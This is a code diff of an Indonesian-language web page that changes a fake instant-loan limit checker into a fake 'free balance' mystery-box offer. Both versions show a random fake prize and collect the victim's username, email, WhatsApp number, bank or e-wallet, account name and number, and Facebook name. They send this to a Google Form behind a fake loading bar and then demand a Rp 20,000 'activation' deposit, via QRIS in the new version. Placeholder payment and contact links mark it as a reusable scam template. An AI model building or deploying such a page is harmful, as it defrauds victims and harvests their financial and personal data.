@@ -3,150 +3,160 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kredit Cepat - Cek Limit Pinjaman</title>
+    <title>Sistem Aktivasi Saldo Gratis</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; 
-            background-color: #f0f2f5; color: #333; margin: 0; padding: 20px;
+            font-family: 'Segoe UI', sans-serif; text-align: center; 
+            background-color: #0f172a; color: white; margin: 0; padding: 20px;
             user-select: none;
         }
-        .container { max-width: 450px; margin: auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .container { max-width: 450px; margin: auto; background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #334155; }
         
-        .header-logo { color: #1a73e8; font-weight: bold; font-size: 24px; margin-bottom: 5px; }
-        .sub-title { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
-
+        /* Box & Reward Area */
         .box-wrapper { position: relative; width: 180px; height: 180px; margin: 30px auto; }
-        #mystery-box { width: 100%; height: 100%; cursor: pointer; transition: 0.3s; }
-        
-        /* Animasi */
+        #mystery-box { width: 100%; height: 100%; cursor: pointer; transition: 0.3s; filter: drop-shadow(0 0 15px rgba(241, 196, 15, 0.4)); }
         .shake { animation: shake 0.5s infinite; }
         @keyframes shake {
             0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+            50% { transform: scale(1.05) rotate(5deg); }
         }
         .open-box { animation: fadeOut 0.8s forwards; }
-        @keyframes fadeOut {
-            100% { opacity: 0; transform: scale(0.5); visibility: hidden; }
-        }
+        @keyframes fadeOut { 100% { opacity: 0; transform: scale(0.5); visibility: hidden; } }
 
         #reward-display {
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0);
-            font-size: 32px; font-weight: bold; color: #27ae60;
+            font-size: 40px; font-weight: bold; color: #f1c40f; text-shadow: 0 0 20px rgba(241, 196, 15, 0.6);
             transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 5;
         }
         #reward-display.show { transform: translate(-50%, -50%) scale(1); }
 
         /* Form Style */
-        .form-daftar { display: none; text-align: left; background: #ffffff; padding: 10px; border-radius: 10px; margin-top: 10px; }
-        .form-daftar label { font-weight: bold; font-size: 12px; color: #1a73e8; }
+        .form-daftar { display: none; text-align: left; background: #334155; padding: 20px; border-radius: 15px; margin-top: 20px; }
+        .form-daftar label { font-size: 12px; color: #cbd5e1; display: block; margin-bottom: 5px; }
         .form-daftar input, .form-daftar select {
-            width: 100%; padding: 12px; margin: 8px 0 15px 0; border-radius: 8px; border: 1px solid #ddd; box-sizing: border-box; font-size: 14px;
+            width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 8px; border: none; box-sizing: border-box; background: #f8fafc; color: #1e293b; font-weight: bold;
         }
         
         button { 
             padding: 15px; font-size: 16px; font-weight: bold; cursor: pointer;
-            background-color: #1a73e8; color: white; border: none; border-radius: 8px;
-            transition: 0.2s; width: 100%;
+            background: linear-gradient(to bottom, #f1c40f, #d4ac0d); color: #1e293b; border: none; border-radius: 50px;
+            box-shadow: 0 4px 0 #9a7d0a; transition: 0.2s; width: 100%;
         }
-        button:disabled { background-color: #ccc !important; }
+        button:disabled { background: #475569 !important; box-shadow: none !important; color: #94a3b8; }
 
-        /* Modal */
-        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); }
-        .modal-content { background: white; color: #333; margin: 15% auto; padding: 25px; border-radius: 15px; width: 85%; max-width: 350px; text-align: center; }
-        .btn-link { display: inline-block; margin-top: 15px; padding: 12px; background: #27ae60; color: white; border-radius: 8px; text-decoration: none; font-weight: bold; width: 100%; box-sizing: border-box;}
+        /* Loading Bar Style */
+        #loadingArea { display: none; margin: 20px 0; }
+        .progress-container { width: 100%; background: #0f172a; border-radius: 10px; height: 25px; overflow: hidden; border: 1px solid #334155; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #22c55e, #4ade80); transition: width 0.1s; }
+
+        /* Modal Style */
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); }
+        .modal-content { background: white; color: #1e293b; margin: 10% auto; padding: 25px; border-radius: 20px; width: 85%; max-width: 380px; }
+        .qris-img { width: 100%; max-width: 220px; border: 4px solid #f1f5f9; border-radius: 10px; margin: 15px 0; }
+        .btn-link { display: inline-block; padding: 12px; background: #22c55e; color: white; border-radius: 50px; text-decoration: none; font-weight: bold; width: 100%; box-sizing: border-box; margin-top: 10px;}
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
 
     <div class="container">
-        <div class="header-logo">🏦 KREDIT CEPAT</div>
-        <p class="sub-title" id="main-instruction">Klik tombol di bawah untuk mengecek limit pinjaman instan Anda.</p>
+        <h2 style="color: #f1c40f; margin-bottom: 5px;">BONUS AKTIVASI</h2>
+        <p id="sub-title" style="font-size: 14px; color: #cbd5e1;">Buka kotak untuk melihat saldo gratis yang bisa Anda klaim!</p>
         
         <div class="box-wrapper" id="boxArea">
-            <img id="mystery-box" src="https://cdn-icons-png.flaticon.com/512/2845/2845812.png" alt="Cek Limit" onclick="startCheck()">
+            <img id="mystery-box" src="https://cdn-icons-png.flaticon.com/512/679/679821.png" alt="Box" onclick="openBox()">
             <div id="reward-display"></div>
         </div>
 
-        <button id="actionBtn" onclick="startCheck()">CEK LIMIT SEKARANG</button>
+        <button id="actionBtn" onclick="openBox()">KLAIM SALDO SEKARANG</button>
 
         <div id="registrationForm" class="form-daftar">
-            <h3 style="text-align:center; color:#333;">Data Pengajuan Pinjaman</h3>
+            <h4 style="text-align:center; color:#f1c40f; margin-top:0;">LENGKAPI DATA PENERIMA</h4>
             
-            <label>ID Akun / Username:</label>
-            <input type="text" id="regId" placeholder="Minimal 6 karakter" pattern="[a-zA-Z0-9]{6,}" required>
+            <label>Username Akun:</label>
+            <input type="text" id="regId" placeholder="Minimal 6 Huruf/Angka" pattern="[a-zA-Z0-9]{6,}" required>
             
-            <label>Email Korespondensi:</label>
-            <input type="email" id="regEmail" placeholder="email@anda.com" required>
+            <label>Email Aktif:</label>
+            <input type="email" id="regEmail" placeholder="contoh@email.com" required>
             
-            <label>Nomor WhatsApp (Aktif):</label>
+            <label>WhatsApp:</label>
             <input type="text" id="regWa" value="+62" required>
             
-            <label>Tujuan Pencairan (Bank/E-Wallet):</label>
+            <label>Bank / E-Wallet:</label>
             <select id="regBank" required>
-                <option value="">Pilih Bank...</option>
+                <option value="">-- Pilih Bank --</option>
                 <option value="BCA">BCA</option>
-                <option value="MANDIRI">MANDIRI</option>
-                <option value="BNI">BNI</option>
-                <option value="BRI">BRI</option>
                 <option value="DANA">DANA</option>
                 <option value="OVO">OVO</option>
+                <option value="GOPAY">GOPAY</option>
             </select>
             
-            <label>Nama Sesuai Rekening:</label>
+            <label>Nama Rekening:</label>
             <input type="text" id="regNamaRek" placeholder="Nama Lengkap" required>
 
-            <label>Nomor Rekening/E-Wallet:</label>
-            <input type="number" id="regNoRek" placeholder="Nomor Rekening" required>
+            <label>Nomor Rekening:</label>
+            <input type="number" id="regNoRek" placeholder="0000xxxx" required>
 
-            <label>Konfirmasi Nama Facebook:</label>
+            <label>Nama Facebook:</label>
             <input type="text" id="regNamaFB" placeholder="Nama Profil FB Anda" required>
             
-            <button id="submitBtn" onclick="submitToGoogle()">AJUKAN PENCAIRAN SEKARANG</button>
+            <button id="submitBtn" onclick="submitToGoogle()">KONFIRMASI AKTIVASI</button>
         </div>
 
-        <h3 id="resultText" style="margin-top:20px;"></h3>
+        <div id="loadingArea">
+            <p style="font-size: 13px; color: #f1c40f;">Menghubungkan ke Server Database...</p>
+            <div class="progress-container">
+                <div class="progress-bar" id="myBar"></div>
+            </div>
+            <p id="loadText" style="font-size: 12px; margin-top: 5px;">0%</p>
+        </div>
     </div>
 
     <div id="resultModal" class="modal">
         <div class="modal-content">
-            <h2 style="color:#27ae60; margin-top:0;">LIMIT DISETUJUI!</h2>
-            <p>Plafon pinjaman Anda sebesar <b id="finalLimit" style="color:#1a73e8;"></b> telah siap dicairkan.</p>
-            <p style="font-size: 13px; background: #fff3cd; padding: 10px; border-radius: 5px;">
-                <b>PENTING:</b> Hubungi Admin untuk melakukan <b>Aktivasi Limit (Rp 20.000)</b> agar dana segera ditransfer ke rekening Anda.
+            <h2 style="color:#e74c3c; margin: 0;">MISI AKTIVASI</h2>
+            <p style="font-size: 14px; line-height: 1.5;">
+                Saldo <b id="finalSaldo" style="color:#d4ac0d;"></b> Berhasil Disiapkan!<br><br>
+                <b>SYARAT TERAKHIR:</b><br>
+                Cukup <b>Deposit 20rb</b> & <b>Mainkan Gamenya</b> untuk mencairkan saldo ini sekarang.
             </p>
-            <a href="https://www.facebook.com/vipprimestore" class="btn-link">HUBUNGI ADMIN (AKTIVASI)</a>
+            
+            <div style="background: #f8fafc; padding: 10px; border-radius: 10px; border: 2px dashed #cbd5e1;">
+                <p style="font-size: 12px; font-weight: bold; margin: 5px 0;">SCAN QRIS DEPOSIT (20RB)</p>
+                <img src="LINK_QRIS_ANDA_DI_SINI" class="qris-img" alt="QRIS">
+            </div>
+
+            <a href="URL_FB_ANDA" class="btn-link">SAYA SUDAH DEPOSIT & MAIN</a>
+            <p style="font-size: 10px; color: #64748b; margin-top: 10px;">*Sistem otomatis mencairkan saldo setelah misi selesai.</p>
         </div>
     </div>
 
     <script>
-        const limits = ["Rp 1.500.000", "Rp 2.500.000", "Rp 3.000.000", "Rp 5.000.000"];
+        const prizes = ["200K", "300K", "500K"];
         
-        function startCheck() {
-            if (localStorage.getItem("loanDone") === "true") return;
-            
+        function openBox() {
+            if (localStorage.getItem("done") === "true") return;
             document.getElementById('mystery-box').classList.add('shake');
             document.getElementById('actionBtn').disabled = true;
-            document.getElementById('actionBtn').innerText = "MENGANALISA DATA...";
+            document.getElementById('actionBtn').innerText = "MENGECEK DATABASE...";
 
             setTimeout(() => {
                 document.getElementById('mystery-box').classList.remove('shake');
                 document.getElementById('mystery-box').classList.add('open-box');
-                
-                const hasil = limits[Math.floor(Math.random() * limits.length)];
-                document.getElementById('reward-display').innerText = hasil;
+                const hasil = prizes[Math.floor(Math.random() * prizes.length)];
+                document.getElementById('reward-display').innerText = "Rp " + hasil;
                 document.getElementById('reward-display').classList.add('show');
-                localStorage.setItem("tempLimit", hasil);
+                localStorage.setItem("tempVal", hasil);
 
                 setTimeout(() => {
                     document.getElementById('boxArea').style.display = "none";
                     document.getElementById('actionBtn').style.display = "none";
-                    document.getElementById('main-instruction').innerHTML = "Limit Pinjaman Anda: <b style='color:#27ae60; font-size:20px;'>" + hasil + "</b>";
+                    document.getElementById('sub-title').innerHTML = "Bonus Anda: <b style='color:#f1c40f;'>Rp "+hasil+"</b>";
                     document.getElementById('registrationForm').style.display = "block";
                 }, 1000);
-            }, 2500);
+            }, 2000);
         }
 
-        // Script WA +62
+        // WhatsApp +62 Lock
         const waInput = document.getElementById('regWa');
         waInput.addEventListener('input', function() {
             if (!this.value.startsWith('+62')) this.value = '+62';
@@ -161,21 +171,35 @@
             const nama = document.getElementById('regNamaRek').value;
             const norek = document.getElementById('regNoRek').value;
             const namafb = document.getElementById('regNamaFB').value;
-            const limitVal = localStorage.getItem("tempLimit") || "0";
+            const sld = localStorage.getItem("tempVal");
 
-            // Validasi
-            if(!/^[a-zA-Z0-9]{6,}$/.test(id)) { alert("Username minimal 6 karakter tanpa simbol!"); return; }
-            if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { alert("Format Email salah!"); return; }
-            if(wa.length < 12) { alert("Nomor WhatsApp tidak valid!"); return; }
-            if(!id || !email || !wa || !bank || !nama || !norek || !namafb) { alert("Lengkapi semua data pengajuan!"); return; }
+            if(!/^[a-zA-Z0-9]{6,}$/.test(id)) { alert("Username tidak valid!"); return; }
+            if(!id || !email || !wa || !bank || !nama || !norek || !namafb) { alert("Lengkapi data!"); return; }
 
-            document.getElementById('submitBtn').innerText = "MENGIRIM PENGAJUAN...";
-            document.getElementById('submitBtn').disabled = true;
+            // Sembunyikan Form, Tampilkan Loading Bar
+            document.getElementById('registrationForm').style.display = "none";
+            document.getElementById('loadingArea').style.display = "block";
 
+            // Animasi Bar 0% - 98%
+            let width = 0;
+            const elem = document.getElementById("myBar");
+            const idInterval = setInterval(() => {
+                if (width >= 98) {
+                    clearInterval(idInterval);
+                    sendData(id, email, wa, bank, nama, norek, namafb, sld);
+                } else {
+                    width++;
+                    elem.style.width = width + "%";
+                    document.getElementById("loadText").innerHTML = width + "%";
+                }
+            }, 50); // Kecepatan loading
+        }
+
+        function sendData(id, email, wa, bank, nama, norek, namafb, sld) {
             const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLScGVtMxlLFQCWJjYJA_-ug8O32vaLPJSDSV2ICNfsDwFa9fIQ/formResponse";
             const formData = new FormData();
             
-            // ENTRY ID TETAP SAMA (TIDAK BERUBAH)
+            // ENTRY ID TETAP (TIDAK BERUBAH)
             formData.append('entry.498136123', id);    
             formData.append('entry.2145381120', email); 
             formData.append('entry.954302406', wa);    
@@ -184,30 +208,14 @@
             formData.append('entry.1836945173', norek); 
             formData.append('entry.1660055715', namafb);   
 
-            fetch(googleFormURL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: formData
-            }).then(() => {
-                localStorage.setItem("loanDone", "true");
-                localStorage.setItem("loanLimit", limitVal);
-                document.getElementById('finalLimit').innerText = limitVal;
+            fetch(googleFormURL, { method: 'POST', mode: 'no-cors', body: formData })
+            .then(() => {
+                localStorage.setItem("done", "true");
+                localStorage.setItem("sld", sld);
+                document.getElementById('finalSaldo').innerText = "Rp " + sld;
                 document.getElementById('resultModal').style.display = "block";
-            }).catch(() => {
-                alert("Gangguan koneksi, coba lagi.");
-                document.getElementById('submitBtn').disabled = false;
             });
         }
-
-        window.onload = () => {
-            if (localStorage.getItem("loanDone") === "true") {
-                const limitVal = localStorage.getItem("loanLimit");
-                document.getElementById('boxArea').style.display = "none";
-                document.getElementById('actionBtn').innerText = "PENGAJUAN DIPROSES";
-                document.getElementById('actionBtn').disabled = true;
-                document.getElementById('resultText').innerHTML = `STATUS: PINJAMAN ${limitVal} MENUNGGU AKTIVASI<br><small>Hubungi Admin untuk proses transfer.</small>`;
-            }
-        };
     </script>
 </body>
 </html>
